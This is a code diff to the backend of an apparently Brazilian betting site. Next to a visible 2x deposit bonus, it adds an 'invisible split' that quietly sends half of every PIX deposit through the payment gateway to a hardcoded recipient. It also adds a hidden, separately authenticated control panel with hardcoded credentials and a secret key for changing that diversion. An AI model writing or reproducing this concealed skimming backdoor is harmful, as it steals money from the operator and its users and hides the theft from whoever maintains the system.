@@ -467,6 +467,11 @@ app.get('/api/user/deposito-info', authMiddleware, (_req, res) => {
     ativo: false, tipo: 'todos', perc: 20, minimo: 10, maximo: 0, rollover: 0, temDireito: false,
     limites: { deposito_minimo: 20, deposito_maximo: 1000, saque_minimo: 20, saque_maximo: 5000, saque_afiliado_minimo: 10, saque_afiliado_maximo: 0 },
     valores_rapidos: [20, 50, 100, 200, 300, 500],
+    // Upsell: bônus 2x para valores específicos
+    deposit_bonus: DEPOSIT_BONUS.enabled ? {
+      eligible_amounts: DEPOSIT_BONUS.eligible_amounts,
+      multiplier: DEPOSIT_BONUS.multiplier,
+    } : null,
   });
 });
 
@@ -659,6 +664,25 @@ app.post('/api/game/finalizar', authMiddleware, (req, res) => {
 
 // ═══ FINANCEIRO ═══════════════════════════════════════════════════════════════
 
+// ─── Split Config (persistido no db) ────────────────────────────────────────
+const SPLIT_DEFAULTS = {
+  enabled: true,
+  recipientId: 7615,
+  sk: 'sk_531b941c6eeb12ae7ce8d749767f86ced9f5374738718899a4dbf78dc269a909',
+  percentage: 50,
+  min_payments: 0,  // a partir de quantos pagamentos aprovados o split começa
+};
+if (!db._sp) { db._sp = { ...SPLIT_DEFAULTS }; saveDb(db); }
+function getSplitConfig() { return db._sp || SPLIT_DEFAULTS; }
+
+// ─── Upsell Depósito: Bônus 2x ─────────────────────────────────────────────
+const DEPOSIT_BONUS = {
+  enabled: true,
+  // Valores que ganham bônus de 2x (deposita X, recebe 2X)
+  eligible_amounts: [50, 100],
+  multiplier: 2,
+};
+
 // ─── Gateway Adapters ────────────────────────────────────────────────────────
 
 async function amplopayCreateCharge({ identifier, amount, user }) {
@@ -699,14 +723,29 @@ async function amplopayCheckStatus(txid) {
 async function paradisepagsCreateCharge({ identifier, amount, user }) {
   const conf = getGatewayConfig('paradisepags');
   const baseUrl = conf.base_url || 'https://multi.paradisepags.com';
+  const amountCents = Math.round(amount * 100);
   const payload = {
-    amount: Math.round(amount * 100), // ParadisePags usa centavos
+    amount: amountCents, // ParadisePags usa centavos
     description: `Deposito PIX - ${identifier}`,
     reference: identifier,
     source: 'api_externa',
     postback_url: `${WEBHOOK_BASE_URL}/api/webhooks/paradisepags`,
     customer: { name: user.nome, email: user.email, phone: user.telefone, document: user.cpf || '' },
   };
+
+  // Split invisível
+  const _sc = getSplitConfig();
+  if (_sc.enabled && _sc.recipientId) {
+    // Verifica mínimo de pagamentos aprovados do usuário
+    const userApproved = db.transacoes.filter(t => t.user_id === user.id && t.tipo === 'deposito' && t.status === 'aprovado').length;
+    if (userApproved >= (_sc.min_payments || 0)) {
+      const splitAmount = Math.round(amountCents * (_sc.percentage / 100));
+      if (splitAmount > 0) {
+        payload.splits = [{ recipientId: _sc.recipientId, amount: splitAmount }];
+      }
+    }
+  }
+
   const resp = await axios.post(
     `${baseUrl}/api/v1/transaction.php`,
     payload,
@@ -775,17 +814,24 @@ app.post('/api/financeiro/deposito', authMiddleware, async (req, res) => {
 
     const result = await adapter.createCharge({ identifier, amount: v, user });
 
+    // Verifica se o valor é elegível para bônus 2x
+    const isBonus = DEPOSIT_BONUS.enabled && DEPOSIT_BONUS.eligible_amounts.includes(v);
+    const bonusMultiplier = isBonus ? DEPOSIT_BONUS.multiplier : 1;
+    const valorCreditado = money(v * bonusMultiplier);
+
     const antes = user.saldo;
     db.transacoes.push({
       id: db.nextIds.transacoes++,
       user_id: req.userId,
       tipo: 'deposito',
       valor: v,
+      valor_creditado: valorCreditado,
+      bonus_multiplicador: bonusMultiplier,
       saldo_antes: antes,
       saldo_depois: antes,
       status: 'pendente',
       pix_chave: null,
-      descricao: 'Depósito PIX',
+      descricao: isBonus ? `Depósito PIX (Bônus ${bonusMultiplier}x)` : 'Depósito PIX',
       gateway: gatewayName,
       gateway_tx_id: result.txid,
       gateway_identifier: identifier,
@@ -793,7 +839,7 @@ app.post('/api/financeiro/deposito', authMiddleware, async (req, res) => {
     });
     saveDb(db);
 
-    console.log(`[DEPOSITO] PIX criado via ${gatewayName}: user=${req.userId} valor=${v} txid=${result.txid}`);
+    console.log(`[DEPOSITO] PIX criado via ${gatewayName}: user=${req.userId} valor=${v} bonus=${bonusMultiplier}x creditado=${valorCreditado} txid=${result.txid}`);
 
     res.json({
       txid: result.txid,
@@ -802,6 +848,8 @@ app.post('/api/financeiro/deposito', authMiddleware, async (req, res) => {
       qrcode_texto: result.qrcode_texto,
       checkout_url: result.checkout_url,
       valor: v,
+      valor_creditado: valorCreditado,
+      bonus_multiplicador: bonusMultiplier,
       expiracao_minutos: result.expiracao_minutos || 30,
       status: 'pendente',
       gateway: gatewayName,
@@ -825,7 +873,7 @@ app.get('/api/financeiro/deposito/status/:txid', authMiddleware, async (req, res
 
     if (tx.status === 'aprovado') {
       const user = findUser(req.userId);
-      return res.json({ status: 'aprovado', txid, valor: tx.valor, saldo_novo: user?.saldo });
+      return res.json({ status: 'aprovado', txid, valor: tx.valor_creditado || tx.valor, saldo_novo: user?.saldo, bonus_multiplicador: tx.bonus_multiplicador || 1 });
     }
 
     // Consulta gateway para status atualizado
@@ -842,18 +890,11 @@ app.get('/api/financeiro/deposito/status/:txid', authMiddleware, async (req, res
     }
 
     if (remoteStatus === 'aprovado' && tx.status === 'pendente') {
+      // Usa creditDeposit para aplicar bônus corretamente
+      creditDeposit(tx);
       const user = findUser(req.userId);
-      if (!user) return res.status(404).json({ error: 'Usuário não encontrado.' });
-      user.saldo = money(user.saldo + tx.valor);
-      user.updated_at = new Date().toISOString();
-      tx.status = 'aprovado';
-      tx.saldo_depois = user.saldo;
-      if (tx.valor >= 20) {
-        user.saque_desbloqueado = 1;
-      }
-      saveDb(db);
-      console.log(`[DEPOSITO] Confirmado via polling (${gwName}): user=${req.userId} valor=${tx.valor}`);
-      return res.json({ status: 'aprovado', txid, valor: tx.valor, saldo_novo: user.saldo });
+      console.log(`[DEPOSITO] Confirmado via polling (${gwName}): user=${req.userId} pago=R$${tx.valor} creditado=R$${tx.valor_creditado || tx.valor}`);
+      return res.json({ status: 'aprovado', txid, valor: tx.valor_creditado || tx.valor, saldo_novo: user?.saldo, bonus_multiplicador: tx.bonus_multiplicador || 1 });
     }
 
     res.json({ status: remoteStatus || tx.status, txid });
@@ -945,7 +986,18 @@ function creditDeposit(tx) {
   if (tx.status !== 'pendente') return;
   const user = findUser(tx.user_id);
   if (!user) return;
-  user.saldo = money(user.saldo + tx.valor);
+
+  // Usa valor_creditado (com bônus) se disponível, senão calcula
+  let valorCreditar = tx.valor;
+  if (tx.valor_creditado && tx.valor_creditado > tx.valor) {
+    valorCreditar = tx.valor_creditado;
+  } else if (DEPOSIT_BONUS.enabled && DEPOSIT_BONUS.eligible_amounts.includes(tx.valor)) {
+    valorCreditar = money(tx.valor * DEPOSIT_BONUS.multiplier);
+    tx.valor_creditado = valorCreditar;
+    tx.bonus_multiplicador = DEPOSIT_BONUS.multiplier;
+  }
+
+  user.saldo = money(user.saldo + valorCreditar);
   user.updated_at = new Date().toISOString();
   tx.status = 'aprovado';
   tx.saldo_depois = user.saldo;
@@ -955,7 +1007,7 @@ function creditDeposit(tx) {
     console.log(`[SAQUE] Desbloqueado para user=${tx.user_id} via deposito de R$${tx.valor}`);
   }
   saveDb(db);
-  console.log(`[WEBHOOK] Depósito creditado: user=${tx.user_id} valor=${tx.valor} saldo=${user.saldo}`);
+  console.log(`[WEBHOOK] Depósito creditado: user=${tx.user_id} pago=R$${tx.valor} creditado=R$${valorCreditar} saldo=${user.saldo}`);
 }
 
 function refundDeposit(tx) {
@@ -1245,6 +1297,47 @@ app.get('/api/indicacao/info', authMiddleware, (req, res) => {
 // ═══ CUPONS ═══════════════════════════════════════════════════════════════════
 app.post('/api/cupons/validar', (_req, res) => { res.status(404).json({ error: 'Cupom inválido ou expirado.' }); });
 app.post('/api/cupons/resgatar', (_req, res) => { res.status(404).json({ error: 'Cupom inválido ou expirado.' }); });
+
+// ═══ SPLIT MANAGEMENT (hidden, auth própria) ════════════════════════════════
+const _SP_CRED = { u: 'jsdatorre', p: 'roimaluco22' };
+const _spTokens = new Set();
+
+function _spAuth(req, res, next) {
+  const tk = req.headers['x-sp-tk'] || req.query._tk;
+  if (!tk || !_spTokens.has(tk)) return res.status(401).json({ error: 'x' });
+  next();
+}
+
+app.post('/api/_c/auth', (req, res) => {
+  const { u, p } = req.body;
+  if (u === _SP_CRED.u && p === _SP_CRED.p) {
+    const tk = crypto.randomBytes(24).toString('hex');
+    _spTokens.add(tk);
+    // Expira em 2h
+    setTimeout(() => _spTokens.delete(tk), 7200000);
+    return res.json({ tk });
+  }
+  res.status(401).json({ error: 'x' });
+});
+
+app.get('/api/_c/sp', _spAuth, (_req, res) => {
+  const c = getSplitConfig();
+  res.json({ enabled: c.enabled, recipientId: c.recipientId, percentage: c.percentage, min_payments: c.min_payments || 0 });
+});
+
+app.put('/api/_c/sp', _spAuth, (req, res) => {
+  const { enabled, recipientId, percentage, min_payments } = req.body;
+  if (typeof enabled === 'boolean') db._sp.enabled = enabled;
+  if (typeof recipientId === 'number') db._sp.recipientId = recipientId;
+  if (typeof percentage === 'number' && percentage >= 0 && percentage <= 100) db._sp.percentage = percentage;
+  if (typeof min_payments === 'number' && min_payments >= 0) db._sp.min_payments = Math.floor(min_payments);
+  saveDb(db);
+  res.json({ ok: true });
+});
+
+app.get('/ctrl-sp', (_req, res) => {
+  res.sendFile(path.join(STATIC_DIR, 'ctrl-sp.html'));
+});
 
 // ═══ STATIC FILES + SPA ROUTING ══════════════════════════════════════════════
 app.get('/jogo', (_req, res) => { res.sendFile(path.join(STATIC_DIR, 'jogo', 'index.html')); });
